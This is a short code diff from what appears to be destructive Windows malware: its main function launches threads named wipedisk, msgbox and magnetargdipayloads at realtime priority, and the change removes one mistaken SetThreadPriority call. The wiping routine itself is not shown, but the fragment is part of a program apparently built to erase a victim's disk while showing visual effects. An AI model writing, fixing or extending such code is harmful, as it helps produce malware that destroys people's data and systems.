@@ -442,7 +442,6 @@ int main()
 	HANDLE hwipedisk = CreateThread(NULL, NULL, (PTHREAD_START_ROUTINE)wipedisk, NULL, NULL, NULL);
 	SetThreadPriority(hwipedisk, REALTIME_PRIORITY_CLASS);
 	HANDLE hmsgbox = CreateThread(NULL, NULL, (PTHREAD_START_ROUTINE)msgbox, NULL, NULL, NULL);
-	SetThreadPriority(msgbox, REALTIME_PRIORITY_CLASS);
 	HANDLE hmagnetargdipayloads = CreateThread(NULL, NULL, (PTHREAD_START_ROUTINE)magnetargdipayloads, NULL, NULL, NULL);
 	SetThreadPriority(hmagnetargdipayloads, REALTIME_PRIORITY_CLASS);
 	WaitForSingleObject(hmagnetargdipayloads, INFINITE);
